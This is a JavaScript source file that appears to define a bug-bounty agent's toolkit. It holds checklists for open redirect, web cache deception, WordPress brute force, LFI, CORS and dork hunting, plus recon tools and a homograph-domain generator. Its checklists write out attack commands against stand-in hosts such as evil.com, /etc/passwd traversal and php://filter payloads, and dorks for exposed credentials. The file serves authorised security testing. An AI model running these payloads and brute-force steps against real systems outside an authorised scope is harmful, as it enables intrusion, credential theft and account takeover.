			"Bypass wordlists (loxs/payloads/or.txt) with the nested while-read qsreplace loop; look for any payload producing a redirect to google.com",
			"ffuf -mc 301,302,303,307,308 and -mr 'Location: http://google.com' through Burp; look for 3xx with attacker-controlled Location",
			"Burp Discover Content crawl + Repeater fuzzing with auto URL-encoding disabled; look for 300-series with Location matching google.com",
			"Chain open redirect to XSS with javascript: payloads and OAuth callback flows; look for token/credential theft to ATO"
		],
		techniques: ["gau/katana/urlfinder + gf redirect | uro", "qsreplace https://evil.com | httpx -fr -mr", "loxs/payloads/or.txt bypass lists", "ffuf -mr 'Location:' + Burp crawl", "javascript: + OAuth redirect chains"]
	},
	{
		slug: "cache-deception",
		name: "Web Cache Deception",
		description: "Advanced web cache deception ('Mastering Web Cache Deception Vulnerabilities'): static-extension appends, cache-header verification, force-cache headers, encoded paths, delimiter injections, mass hunting.",
		checks: [
			"Append static-like extensions (.css, .js, .png, .svg, .json) to sensitive endpoints (/account, /profile, /dashboard, /settings, /admin, /my-account); look for X-Cache: HIT with sensitive content to unauthenticated requests",
			"Check cache indicators (X-Cache HIT/MISS, Cache-Control, Age, CF-Cache-Status) with curl -I on poisoned URLs; look for cacheable responses from private pages",
			"Repeated identical requests, cache-busting params (?v=123) and timing analysis; look for responses served from cache vs origin",
			"X-Original-URL, X-Rewrite-URL, X-Forwarded-Host, X-Forwarded-Path headers to force caching; look for cache-key confusion",
			"Encoded traversal-style URLs (/%2e%2e/...) before static extensions; look for cache-vs-origin path interpretation discrepancies",
			"Query-parameter cache-key injection (?callback=static.js, ?file=main.js) on sensitive endpoints; look for cached private content",
			"Delimiter injections before extensions (~ \\ / ; : // %60 %5c %3d %2e); look for cache-rule bypasses serving dynamic content",
			"Combined extension+directory patterns (.js/*, /admin.css/login, /settings/fake.js); look for cached sensitive pages",
			"Mass hunt: gau filtered to sensitive paths, append /style.css, probe httpx-toolkit -mc 200; look for 200s exposing private pages",
			"Full exploit in authenticated-then-logged-out flow with incognito verification; look for cached account data (username, email, session_token) served to unauthenticated visitors"
		],
		techniques: ["append static ext to sensitive endpoints", "X-Cache / CF-Cache-Status / Age verification", "force-cache + forwarded headers", "delimiter battery (~ \\ / ; : %60 %5c %3d)", "gau | httpx mass hunting"]
	},
	{
		slug: "wordpress",
		name: "WordPress Bug Hunting",
		description: "Mastering WordPress bug hunting ('Mastering WordPress Bug Hunting'): wpscan enumeration, REST API username enumeration + bypasses, XML-RPC abuse, config/backup exposure, setup-config wizard, admin-ajax handlers.",
		checks: [
			"wpscan --url https://target --disable-tls-checks --api-token <token> -e at -e ap -e u --plugins-detection aggressive --force; look for known-vulnerable plugin/theme versions",
			"REST usernames via /wp-json/wp/v2/users and bypasses (?rest_route=/wp/v2/users, /index.php?rest_route=, ?per_page=100, ?search=admin, direct ID probing); look for usernames to feed brute force",
			"Admin brute force with wpscan --username/--usernames/--passwords and XML-RPC (--max-threads 10); look for logins and system.multicall amplification",
			"Exposed config/backup files (/wp-config.php.bak/.save/.old, /.env, /backup.zip, /db.sql, /dump.sql, /.htpasswd, /phpinfo.php); look for DB credentials or archives",
			"dirsearch recursive fuzzing with extension list and ffuf (seclists + wp-fuzz, -fc 400-503, recursion); look for hidden admin/uploads/backup paths",
			"Registration exposure on /wp-login.php?action=register (match user_login/user_email + 200); look for open registration enabling spam/privilege abuse",
			"Setup-wizard exposure /wp-admin/setup-config.php?step=1; look for re-runnable installers that could rewrite config and take over the site/DB",
			"xmlrpc.php enabled methods (system.multicall, pingback) for brute-force/DDoS abuse; look for unauthenticated RPC access",
			"admin-ajax.php unauthenticated action handlers of plugins/themes; look for XSS or RCE via exposed callbacks",
			"IDOR on ?post_id= style params and REST object endpoints; look for unauthorized cross-user data access"
		],
		techniques: ["wpscan --url --disable-tls-checks --api-token -e at -e ap -e u --plugins-detection aggressive --force", "wp-json user enum + rest_route bypasses", "xmlrpc system.multicall", "wp-config/.env/backup file probes", "setup-config.php installers"]
	},
	{
		slug: "ct-monitor",
		name: "Certificate Transparency Monitoring",
		description: "Real-time CT log monitoring ('Monitor Bug Bounty Targets in Real Time Using Certificate Transparency Logs'): crtmon alerts, Discord/Telegram notifications, fresh-asset racing before other scanners.",
		checks: [
			"crtmon -target example.com; look for instant alerts on newly issued subdomain certificates",
			"Multi-target monitoring with a domains.txt list or stdin (-target -); look for one persistent process covering the whole scope",
			"Discord webhook + Telegram bot token in provider.yaml with -notify both; look for alerts arriving on both platforms",
			"nohup + @reboot crontab entry logging to /tmp/crtmon.log; look for crtmon restarting after reboot",
			"Fresh-asset workflow: immediately probe newly alerted subdomains (httpx + nuclei) before automated scanners catch up; look for vulnerable services others haven't touched",
			"-config custom.yaml to scope different target sets per notification preference; look for correct alert routing per group"
		],
		techniques: ["crtmon real-time CT monitoring", "Discord/Telegram webhook alerts", "fresh-asset httpx+nuclei race", "crt.sh json (name_value + not_before) sorting"]
	},
	{
		slug: "url-collection",
		name: "URL Collection Pipelines",
		description: "Harvest + dedupe URL inventory across passive sources (subfinder -> httpx, gau, waybackurls, katana -ps) and normalize parameter names for downstream fuzzing. Command-line pipelines, no keys needed for the public archives.",
		checks: [
			"subfinder -dL domain.txt -all -silent | httpx -silent | tee sub.txt — enumerate all subdomains (passive, brute-force, resolvers) then probe for live HTTP hosts",
			"gau --threads 5 --subs domain.com | tee gau.txt — fetch known URLs for the domain and all subdomains from public archives (Wayback, CommonCrawl, AlienVault, URLScan)",
			"katana -ps -pss waybackarchive,commoncrawl,alienvault -d 5 -u https://target.com | tee katana.txt — JS-rendered crawl with passive source expansion for client-side-only routes",
			"cat sub.txt | waybackurls | tee wayback.txt — Wayback Machine URL harvesting for every live host (cheap, fast, huge coverage)",
			"cat gau.txt wayback.txt katana.txt | sort -u | urldedupe | tee url.txt — merge all archives, dedupe keeping query structure, remove duplicates",
			"cat url.txt | sed 's/=.*/=/' | sort -u > param.txt — strip parameter values to get unique URLs with parameter names for fuzzing (param.txt is the seed list for arjun/ffuf/qsreplace)",
			"httpx -l sub.txt -content-type -p 80,443,8080,8000,8888 -threads 200 -o content_type.txt — filter live hosts by response content-type; grep json/php/aspx to isolate API vs server-side-language targets",
			"cat content_type.txt | grep json — focus API/JSON endpoints first; grep -E 'php|aspx|jsp' to pick server-side language targets for LFI/SQLi testing"
		],
		techniques: ["subfinder+httpx live-host pipeline", "gau/waybackurls/katana archive mining", "urldedupe dedup", "sed 's/=.*/=/' parameter-name extraction", "httpx -content-type filtering"]
	},
	{
		slug: "sensitive-data",
		name: "Sensitive Data & File Discovery",
		description: "Hunt exposed files across the harvested URL inventory and search engines: configs, archives, DB dumps, key material, .git, env files, backup bundles — plus Shodan cert-CN dorks for org-owned hosts.",
		checks: [
			"cat url.txt | grep -E '\\.(xls|xml|json|pdf|sql|doc|docx|pptx|txt|zip|tar\\.gz|tgz|bak|ost|wim|rar|7z|reg|db|jar|war|git|gitignore|py|csv|rtf|jpg|png|gif|env|log|lock|key|p12|pem|der|csr|conf|cfg|ini|sqlite|sqlcipher|tar|zip|apk|apkg|whl|deb|rpm|msi|exe|dll|so|sh|php|pl|asp|aspx|jsp|jspx|do|action|java|class|mmdb|accdb|sqlite3|db3|dat|bin|hex|backup|bak)$' — grep harvested URLs for sensitive file extensions (configs, archives, DB dumps, key material)",
			"Google dork: site:*.example.com ext:doc OR ext:docx OR ext:xls OR ext:xlsx OR ext:pdf OR ext:csv OR ext:txt OR ext:sql OR ext:zip OR ext:rar OR ext:tar.gz OR ext:bak OR ext:log OR ext:env OR ext:key OR ext:pem — index-of style sensitive document discovery",
			"httpx -l sub.txt -path /.git/ -ms 'Index of' — detect exposed .git directories across live hosts; follow up with git-dumper to extract the repository",
			"httpx -l sub.txt -path /.git/config -ms '\\[core\\]' — confirm readable .git/config for repository extraction (see bb_git_exposure)",
			"gau --subs domain.com | grep -E '\\.(js|mjs)$' | sort -u — collect JS bundles and grep for api_key, secret, token, password, aws (see bb_js_secrets for the automated miner)",
			"s3scanner scan --bucket-file buckets.txt — scan derived bucket names for open/listable S3 (see bb_s3_probe for the keyless probe)",
			"Shodan dork: ssl.cert.subject.CN:example.com — find IPs/certificates issued for the org, then check port 80/443 for exposed backup files and admin panels (Shodan API key needed for the full query)"
		],
		techniques: ["extension-based sensitive-file grep", "Google dork ext: battery", ".git exposure httpx -ms 'Index of'", "JS bundle secret grep", "s3scanner bucket scan", "Shodan ssl.cert.subject.CN dork"]
	},
	{
		slug: "lfi",
		name: "LFI / Path Traversal",
		description: "Local File Inclusion pipeline: harvest dynamic endpoints, inject FUZZ via qsreplace, fuzz with ffuf matching the /etc/passwd root-line signature, raw-request fuzzing, PHP wrappers and double-encoded traversal.",
		checks: [
			"gau domain.com | grep -E '\\.(php|asp|aspx|jsp|do|action)' | gf lfi | urldedupe | tee lfi.txt — harvest archive URLs and filter for LFI-prone dynamic endpoints",
			"cat lfi.txt | sed 's/=.*/=/' | sort -u | qsreplace 'FUZZ' | tee lfi_fuzz.txt — strip values and replace with FUZZ marker for ffuf",
			"ffuf -w wordlist.txt -u https://target.com/FUZZ -p 0.1 -t 10 -mr 'root:(x|\\*|\\$[^\\:]*):0:0:' -o lfi.json — match the /etc/passwd root-line signature in responses (or 'root:' for shorter)",
			"ffuf -request lfi.txt -request-proto https -w wordlist.txt -mr 'root:' — raw-request fuzzing when the endpoint needs custom headers/cookies (copy from Burp, tweak the FUZZ line)",
			"Test php://filter/convert.base64-encode/resource=/etc/passwd and data:// wrappers on PHP LFI params — look for base64-encoded file contents in the response",
			"Double-encode traversal: %252e%252e%252f, %252e%252e%255c etc. to bypass filters; test both path and query injection points",
			"Validate every hit by reading a real file (e.g. /etc/passwd root:0:0:0) — generic 'include' errors without file contents are usually not exploitable"
		],
		techniques: ["gau|gf lfi|uro pipeline", "qsreplace FUZZ", "ffuf -mr root: regex match", "ffuf -request raw", "php://filter wrapper", "double-encoded traversal"]
	},
	{
		slug: "cors",
		name: "CORS Misconfiguration",
		description: "Cross-Origin Resource Sharing checks: Origin reflection, null origin, credentialed preflight, automated scanners. A reflected ACAO + Access-Control-Allow-Credentials: true + no Vary: Origin turns any authenticated endpoint into a cross-origin read.",
		checks: [
			"curl -H 'Origin: http://example.com' -I https://target.com/ — check Access-Control-Allow-Origin for origin reflection (baseline with a domain you don't own)",
			"Reflection test: if ACAO echoes the Origin header verbatim, the app reflects arbitrary origins — retest with https://evil.com and check Access-Control-Allow-Credentials: true",
			"curl -H 'Origin: null' -I https://target.com/ — null origin (sandboxed iframes, data: URIs) is attacker-controllable; flag ACAO: null + ACAC: true",
			"curl -X OPTIONS -H 'Origin: http://evil.com' -H 'Access-Control-Request-Method: GET' -I https://target.com/ — preflight reveals ACAO/ACAC for credentialed cross-origin requests (see bb_cors_scan)",
			"python3 CORScanner.py -u https://target.com -d -t 10 — automated CORS misconfiguration scanner (checks multiple origins + credentials)",
			"nuclei -t nuclei-templates/vulnerabilities/cors/ -l targets.txt — template-based CORS checks across the target list",
			"Impact check: ACAO reflects attacker origin + Access-Control-Allow-Credentials: true + no Vary: Origin — any authenticated endpoint becomes readable cross-origin; confirm with a credentialed fetch from an attacker page"
		],
		techniques: ["Origin reflection curl", "null-origin test", "OPTIONS preflight", "CORScanner", "nuclei cors templates"]
	},
	{
		slug: "google-dorks",
		name: "Google / Shodan Dorks",
		description: "Search-engine recon: ext: dorks for sensitive docs, intitle:index of for directory listings, inurl:.env/config for exposed settings, default-server title dorks for unhardened hosts, Shodan cert-CN and title dorks for org inventory.",
		checks: [
			"site:*.example.com ext:doc OR ext:docx OR ext:xls OR ext:xlsx OR ext:pdf OR ext:csv OR ext:txt OR ext:sql OR ext:zip OR ext:env OR ext:key OR ext:pem — find sensitive indexed documents (see sensitive-data category)",
			"intitle:'index of' site:example.com — directory listings indexed by Google; also try inurl:admin, inurl:backup, inurl:config, inurl:uploads for listing-prone paths",
			"inurl:.env intext:APP_KEY OR intext:DB_PASSWORD site:example.com — exposed environment/config files with credential strings in the body",
			"intitle:'Welcome to nginx!' OR intitle:'Apache2 Ubuntu Default Page' OR intitle:'IIS Windows Server' — default server pages reveal unhardened hosts (also check /server-status, /phpinfo.php on hits)",
			"Shodan dork: ssl.cert.subject.CN:example.com — enumerate hosts by certificate CN; filter port 443 + status 200 for live org-owned services",
			"Shodan dork: http.title:'login' hostname:example.com — find login portals by page title; combine with http.html:password for exposed login forms",
			"Dork hygiene: validate every hit with httpx before manual testing; Google results lag real exposure, so pair dorks with bb_wayback_urls + bb_ct_fresh_assets for fresher inventory"
		],
		techniques: ["site: ext: dork battery", "intitle:'index of' dorks", "inurl:.env/config dorks", "default-server title dorks", "Shodan ssl.cert.subject.CN", "Shodan http.title login"]
	}
];

const SOURCE_AUDIT = {
	methodology: [
		"Understand the architecture first (README, docs, build system) — hunt the attack surface before the code",
		"Map trust boundaries and entry points: what input reaches the code, from who, sanitized or not",
		"Focus on input-handling code: parsers, decoders, protocol handlers, serialization",
		"Grep dangerous-call patterns (memcpy, strcpy, eval, unsafe, unwrap, exec) and read each hit in context",
		"Trace data flow from untrusted input to the sink (alloc, copy, eval, query) and check every step",
		"Variant analysis per finding: same bug class elsewhere, adjacent parsers, error paths",
		"Validate with a PoC before reporting; ASAN/UBSAN builds to prove memory bugs"
	],
	priority: [
		"Parsers (file formats, protocols, serialization)",
		"Memory management (allocators, pools, refcounts)",
		"IPC/network handlers",
		"Privilege boundaries (setuid, sandbox escape, ACL checks)",
		"Error handling paths",
		"Concurrency (locks, TOCTOU, races)"
	],
	languages: [
		{
			slug: "c-cpp",
			name: "C/C++",
			checks: [
				"memcpy/strcpy/sprintf without bounds validation",
				"malloc(user_controlled * sizeof) integer overflow",
				"missing null checks after allocation",
				"use-after-free (free then deref), double-free",
				"signed/unsigned comparison in bounds checks",
				"stack buffer overflow via unchecked recursion/fixed sizes"
			],
			grep: ["memcpy", "strcpy", "sprintf", "malloc", "free", "realloc", "gets"]
		},
		{
			slug: "rust",
			name: "Rust",
			checks: [
				"audit every unsafe block one by one",
				"unwrap()/expect() in library code (panics on bad input)",
				"raw pointer arithmetic and derefs",
				"FFI boundary mismatches (wrong types, null pointers)",
				"transmute misuse",
				"unsafe with references to user-controlled buffers"
			],
			grep: ["unsafe", "unwrap(", "transmute", "as *", "from_raw"]
		},
		{
			slug: "go",
			name: "Go",
			checks: [
				"goroutine leaks (spawn without cancel/quit channel)",
				"race conditions (missing mutex on shared state)",
				"slice bounds panics from untrusted indices",
				"unsafe.Pointer casts",
				"ignored errors (_ = f())",
				"TOCTOU between stat and open/read"
			],
			grep: ["go func", "unsafe.Pointer", "_ = ", "select {", "os.Open"]
		},
		{
			slug: "js-ts",
			name: "JavaScript/TypeScript",
			checks: [
				"prototype pollution (merge/clone with __proto__ keys)",
				"eval()/Function constructor on user input",
				"template injection reaching sinks (SSR, email, SQL)",
				"path traversal in file operations",
				"ReDoS in regex patterns",
				"child_process exec/spawn with unsanitized args"
			],
			grep: ["__proto__", "eval(", "new Function", "child_process", "path.join", "regExp"]
		}
	]
};

// ---------------------------------------------------------------------------
// triage methodology — merged from bughunt obsidian-templates/bug-report.md
// (Rhat scoring table + verdicts + status tracking), FINDINGS.md (verdict
// classes: separating genuine bugs from design opinions) and SOL.md/FINDINGS.md
// (SQLite concurrency audit checklist).
// ---------------------------------------------------------------------------

const TRIAGE = {
	rubric: [
		"P(real_bug) — is this an actual defect, not intended behaviour or a false positive?",
		"P(feasible) — can it realistically be triggered/exploited in the real deployment?",
		"P(reproducible) — can you reproduce it deterministically from the report alone?",
		"P(new_root_cause) — does it expose a NEW root cause vs. an already-known/duplicate issue?",
		"expected_impact — severity of the outcome if triggered (confidentiality/integrity/availability)",
		"Rhat Score — weighted combination of the above; drives the verdict (REPORT / INVESTIGATE / DISCARD)"
	],
	verdicts: [
		"REPORT — high Rhat: genuine bug, feasible, reproducible -> draft report + PoC",
		"INVESTIGATE — medium Rhat: promising but unproven -> dig deeper before deciding",
		"DISCARD — low Rhat: not a real bug, not feasible, or duplicate -> log and move on"
	],
	status_flow: [
		"Triaged", "Reproduced", "Root cause identified", "PoC written", "Report drafted",
		"Submitted", "Acknowledged by vendor", "Fixed", "Bounty paid"
	],
	finding_classes: [
		"Genuine (high confidence)",
		"Likely genuine (needs code verification)",
		"Depends / conditional (only if a path is reachable)",
		"Defensive improvement (hardening, not a bug today)",
		"Design issue / opinion (tradeoff, not a defect)",
		"Minor optimization (style/perf, low value)",
		"Probably incorrect (overstated claim)",
		"Not an issue (common idiom, false positive)",
		"Style only (no behavioural impact)"
	],
	sqlite_audit: [
		"transaction boundaries (BEGIN IMMEDIATE vs. implicit transactions)",
		"concurrent scheduler/dashboard access to the same DB",
		"WAL checkpoint strategy",
		"retry behavior on SQLITE_BUSY",
		"foreign-key enforcement across all migrations",
		"schema migration rollback behavior"
	],
	report_template: [
		"id (BUG-YYYY-HHMMSS)", "target", "class", "severity", "rhat_score", "status",
		"summary", "affected component (project/file/function/commit)",
		"reproduction steps", "ASAN/crash output", "root cause analysis",
		"PoC", "fix recommendation", "related bugs/CVEs", "campaign link"
	]
};

// ---------------------------------------------------------------------------
// tool definitions
// ---------------------------------------------------------------------------

// ---- helpers for the 16 new tools (spliced before `const TOOLS = [`) ----

const BASIC_DIGIT = "abcdefghijklmnopqrstuvwxyz0123456789";
// minimal RFC 3492 punycode encoder (dependency-free, Node 22 has no core 'punycode')
function punyAdapt(delta, numPoints, firstTime) {
	delta = firstTime ? Math.floor(delta / 700) : delta >> 1;
	delta += Math.floor(delta / numPoints);
	let k = 0;
	const base = 36, tmin = 1, tmax = 26, skew = 38;
	while (delta > Math.floor(((base - tmin) * tmax) / 2)) {
		delta = Math.floor(delta / (base - tmin));
		k += base;
	}
	return k + Math.floor(((base - tmin + 1) * delta) / (delta + skew));
}
function punyEncodeLabel(input) {
	const cps = [...String(input)].map((c) => c.codePointAt(0));
	const basic = cps.filter((c) => c < 128);
	if (basic.length === cps.length) return String(input);
	let n = 128, delta = 0, bias = 72, out = "";
	const base = 36, tmin = 1, tmax = 26;
	out += String.fromCodePoint(...basic);
	if (basic.length) out += "-";
	let h = basic.length;
	while (h < cps.length) {
		let m = Infinity;
		for (const c of cps) if (c >= n && c < m) m = c;
		delta += (m - n) * (h + 1);
		n = m;
		for (const c of cps) {
			if (c < n) delta++;
			else if (c === n) {
				let q = delta;
				for (let k = base; ; k += base) {
					const t = k <= bias ? tmin : k >= bias + tmax ? tmax : k - bias;
					if (q < t) break;
					const digit = t + ((q - t) % (base - t));
					out += BASIC_DIGIT[digit];
					q = Math.floor((q - t) / (base - t));
				}
				out += BASIC_DIGIT[q];
				bias = punyAdapt(delta, h + 1, h === basic.length);
				delta = 0;
				h++;
			}
		}
		delta++;
		n++;
	}
	return out;
}
function punyDomain(domain) {
	return String(domain)
		.split(".")
		.map((l) => (l === punyEncodeLabel(l) ? l : "xn--" + punyEncodeLabel(l)))
		.join(".");
}
// confusables: ASCII -> visually-similar Unicode (Cyrillic/Greek/etc.)
const HOMOGRAPH_MAP = {
	a: "\u0430", c: "\u0441", e: "\u0435", h: "\u04bb", i: "\u0456",
	j: "\u0458", k: "\u043a", l: "\u217c", m: "\u217f", o: "\u043e",
	p: "\u0440", q: "\u051b", s: "\u0455", w: "\u051d", x: "\u0445",
	y: "\u0443", b: "\u044c",
};
function homographVariants(local, cap) {
	const variants = [];
	const chars = [...String(local)];
	const idx = chars.flatMap((ch, i) => (HOMOGRAPH_MAP[ch.toLowerCase()] ? [i] : []));
	if (!idx.length) return variants;
	const pick = Math.min(cap, idx.length + 2);
	for (let n = 1; n <= Math.min(2, idx.length); n++) {
		for (let s = 0; s < pick && variants.length < cap; s++) {
			const perm = idx.slice(s, s + n);
			if (!perm.length) continue;
			const next = chars.map((ch, i) => {
				if (perm.includes(i)) {
					const base = HOMOGRAPH_MAP[ch.toLowerCase()];
					return ch === ch.toLowerCase() ? base : base.toUpperCase();
				}
				return ch;
			});
			const joined = next.join("");
			if (joined !== local && !variants.includes(joined)) variants.push(joined);
		}
		if (variants.length >= cap) break;
	}
	return variants;
}
// Wayback CDX JSON collector: { urls: [], error }
async function cdxUrls(domain, exec, opts = {}) {
	const { filterJs = false, cap = 500 } = opts;
	const fl = filterJs ? "original&collapse=urlkey&filter=original:.*\\.js" : "original&collapse=urlkey";
	const url =
		"https://web.archive.org/cdx/search/cdx?url=*." +
		encodeURIComponent(domain) +
		"/*&output=json&fl=" +
		fl +
		"&limit=" +
		Math.min(cap * 4, 4000);
	try {
		const { res } = await fetchRes(url, exec, { budget: 30000, headers: { accept: "application/json" } });
		const text = await readLimited(res, 3_000_000);
		const rows = JSON.parse(text || "[]");
		let urls = (Array.isArray(rows) ? rows.slice(1) : []).map((r) => String(r[0] || "")).filter(Boolean);
		if (filterJs) urls = urls.filter((u) => /\.js([?#]|$)/i.test(u));
		urls = uniq(urls).slice(0, cap);
		return { urls, error: null };
	} catch (e) {
		return { urls: [], error: shortErr(e) };
	}
}
// OTX url_list collector: { urls: [], hosts: [], error }
async function otxUrls(domain, exec, cap = 250) {
	const url = "https://otx.alienvault.com/api/v1/indicators/hostname/" + encodeURIComponent(domain) + "/url_list";
	try {
		const { text } = await fetchText(url, exec, { budget: 25000, headers: { accept: "application/json" } });
		const data = JSON.parse(text || "{}");
		const items = Array.isArray(data.results) ? data.results : [];
		const urls = items.map((it) => it.url || "").filter(Boolean).slice(0, cap);
		const hosts = items.map((it) => it.hostname || "").filter((h, i, a) => h && a.indexOf(h) === i).slice(0, 40);
		return { urls: uniq(urls), hosts, error: null };
	} catch (e) {
		return { urls: [], hosts: [], error: shortErr(e) };
	}
}
// SPF TXT via DNS-over-HTTPS (Cloudflare): { ips: [], includes: [], error }
async function spfTxt(domain, exec) {
	const url = "https://cloudflare-dns.com/dns-query?name=" + encodeURIComponent(domain) + "&type=TXT";
	try {
		const { text } = await fetchText(url, exec, { budget: 12000, headers: { accept: "application/dns-json" } });
		const data = JSON.parse(text || "{}");
		const txts = (data.Answer || [])
			.filter((a) => a.type === 16 && typeof a.data === "string")
			.map((a) => a.data.replace(/"/g, ""));
		const spf = txts.find((t) => /^v=spf1/i.test(t)) || "";
		const ips = spf
			.split(/\s+/)
			.filter((t) => /^(ip4|ip6):/.test(t))
			.map((t) => t.split(":")[1]);
		const includes = spf
			.split(/\s+/)
			.filter((t) => /^include:/.test(t))
			.map((t) => t.split(":")[1]);
		return { ips, includes, txts: txts.slice(0, 5), error: null };
	} catch (e) {
		return { ips: [], includes: [], txts: [], error: shortErr(e) };
	}
}
const TITLE_RE = /<title[^>]*>([^<]{1,90})<\/title>/i;
async function probeTitle(host, exec) {
	for (const scheme of ["https://", "http://"]) {
		try {
			const { res } = await fetchRes(scheme + host + "/", exec, { budget: 8000, redirect: "manual" });
			const text = await readLimited(res, 4000);
			const m = text.match(TITLE_RE);
			return { host, scheme: scheme.slice(0, -3), status: res.status, ctype: res.headers.get("content-type") || "", title: m ? m[1].trim() : "" };
		} catch (e) {
			// try next scheme
		}
	}
	return null;
}
async function fetchWithHeader(url, exec, headerName, headerValue) {
	try {
		const headers = { "user-agent": UA };
		headers[headerName] = headerValue;
		const { res } = await fetchRes(url, exec, { budget: 10000, headers });
		const body = await readLimited(res, 1200);
		return { status: res.status, ctype: res.headers.get("content-type") || "", size: body.length, body };
	} catch (e) {
		return { status: 0, ctype: "", size: 0, body: "", error: shortErr(e) };
	}
}
const CACHE_HDRS = ["x-cache", "cf-cache-status", "age", "cache-control", "x-vercel-cache", "x-proxy-cache", "x-served-by", "x-cache-status"];
function cacheEvidence(res) {
	const ev = [];
	for (const h of CACHE_HDRS) {
		const v = res.headers.get(h);
		if (v) ev.push(h + ": " + v);
	}
	return ev;
}
const TOOLS = [
	{
		name: "bb_enum_subdomains",
		description: "Enumerate subdomains of a domain using keyless passive sources (crt.sh CT logs + HackerTarget hostsearch). Returns deduplicated sorted hostnames and per-source errors.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: { domain: { type: "string", description: "Root domain to enumerate, e.g. example.com (no scheme, no path)" } },
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					subdomains: { type: "array", items: { type: "string" } },
					count: { type: "integer" },
					sources: { type: "array", items: { type: "string" } },
					errors: { type: "array", items: { type: "string" } }
				},
				required: ["domain", "subdomains", "count", "sources", "errors"]
			},
			render: (_args, v) => renderLines(`🔎 bb_enum_subdomains ${v.domain}`, [
				`count: ${v.count} (sources: ${v.sources.join(", ") || "none"})`,
				...(v.errors.length ? [`errors: ${v.errors.join(" | ")}`] : []),
				...v.subdomains.map((s) => `  - ${s}`)
			])
		},
		timeoutMs: 60000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const domain = normalizeDomain(String(args.domain ?? ""));
			if (!DOMAIN_RE.test(domain)) throw new Error(`invalid domain: "${domain}" — use a bare hostname like example.com`);
			const { subdomains, sources, errors } = await enumSubdomains(domain, exec, 500);
			return { domain, subdomains, count: subdomains.length, sources, errors };
		}
	},
	{
		name: "bb_probe_http",
		description: "Fast HTTP(S) liveness probe of a host on given ports (default 80,443). Tries both schemes per port, captures status, final URL, <title> and Server header.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				host: { type: "string", description: "Hostname or IP to probe (no scheme, no path)" },
				ports: { type: "array", items: { type: "integer" }, description: "Optional ports to probe (default [80,443], max 8)" }
			},
			required: ["host"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					host: { type: "string" },
					results: {
						type: "array",
						items: {
							type: "object",
							properties: {
								scheme: { type: "string" },
								port: { type: "integer" },
								status: { type: "integer" },
								ok: { type: "boolean" },
								url: { type: "string" },
								finalUrl: { type: "string" },
								title: { type: "string" },
								server: { type: "string" },
								error: { type: "string" }
							}
						}
					}
				},
				required: ["host", "results"]
			},
			render: (_args, v) => renderLines(`🧭 bb_probe_http ${v.host}`, v.results.map((r) =>
				`  ${r.scheme}://${v.host}:${r.port} → ${r.status}${r.ok ? " ok" : ""}${r.title ? ` — ${r.title}` : ""}${r.server ? ` [${r.server}]` : ""}${r.finalUrl && r.finalUrl !== r.url ? ` → ${r.finalUrl}` : ""}${r.error ? ` (${r.error})` : ""}`
			))
		},
		timeoutMs: 90000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			let host = String(args.host ?? "").trim();
			if (host.includes("://")) {
				try { host = new URL(host).host; } catch { /* keep raw */ }
			}
			host = host.toLowerCase().replace(/\/+$/, "");
			if (!host) throw new Error("host is required");
			if (host.length > 253 || /\s/.test(host)) throw new Error(`invalid host: "${host.slice(0, 60)}"`);
			const ports = normPorts(args.ports);
			const attempts = [];
			for (const port of ports) {
				const schemes = (port === 443 || port === 8443) ? ["https", "http"] : ["http", "https"];
				for (const scheme of schemes) attempts.push({ scheme, port });
			}
			const results = await mapPool(attempts, 4, (a) => probeOnce(host, a.scheme, a.port, exec));
			return { host, results };
		}
	},
	{
		name: "bb_security_headers",
		description: "Audit a live URL's security headers (CSP, HSTS, X-Frame-Options, etc.), server/technology leak headers, and cookie flags (Secure, HttpOnly, SameSite). Never throws on network errors; returns them in `error`.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: { url: { type: "string", description: "Full URL starting with http:// or https://" } },
			required: ["url"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					url: { type: "string" },
					finalUrl: { type: "string" },
					status: { type: "integer" },
					headers: { type: "object", properties: {} },
					missing: { type: "array", items: { type: "string" } },
					leaks: { type: "array", items: { type: "object", properties: { name: { type: "string" }, value: { type: "string" } } } },
					cookieFlags: { type: "array", items: { type: "object", properties: { name: { type: "string" }, missing: { type: "array", items: { type: "string" } } } } },
					error: { type: "string" }
				},
				required: ["url", "finalUrl", "status", "headers", "missing", "leaks", "cookieFlags", "error"]
			},
			render: (args, v) => {
				const lines = [
					`status: ${v.status}${v.finalUrl && v.finalUrl !== v.url ? ` (final: ${v.finalUrl})` : ""}${v.error ? ` — error: ${v.error}` : ""}`,
					`missing (${v.missing.length}): ${v.missing.join(", ") || "none"}`,
					`leaks (${v.leaks.length}): ${v.leaks.map((l) => `${l.name}=${l.value}`).join("; ") || "none"}`,
					`cookies: ${v.cookieFlags.map((c) => `${c.name} [missing: ${c.missing.join(",") || "none"}]`).join(" | ") || "none"}`
				];
				return renderLines(`🛡️ bb_security_headers ${v.url}`, lines);
			}
		},
		timeoutMs: 45000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const url = normalizeUrl(String(args.url ?? ""));
			const out = await securityHeaders(url, exec);
			return { url, finalUrl: out.finalUrl, status: out.status, headers: out.headers, missing: out.missing, leaks: out.leaks, cookieFlags: out.cookieFlags, error: out.error };
		}
	},
	{
		name: "bb_tech_detect",
		description: "Fingerprint the technology stack of a URL from headers (Server, X-Powered-By, cookies, CDN markers) and HTML (WordPress, Next.js, Nuxt, Drupal, Joomla, jQuery, React, GTM).",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: { url: { type: "string", description: "Full URL starting with http:// or https://" } },
			required: ["url"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					url: { type: "string" },
					status: { type: "integer" },
					tech: { type: "array", items: { type: "object", properties: { category: { type: "string" }, name: { type: "string" }, evidence: { type: "string" } } } },
					error: { type: "string" }
				},
				required: ["url", "status", "tech", "error"]
			},
			render: (_args, v) => renderLines(`🧬 bb_tech_detect ${v.url}`, [
				`status: ${v.status}${v.error ? ` — error: ${v.error}` : ""}`,
				...(v.tech.length ? v.tech.map((t) => `  ${t.category}: ${t.name} (${t.evidence})`) : ["  (no fingerprints matched)"])
			])
		},
		timeoutMs: 45000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const url = normalizeUrl(String(args.url ?? ""));
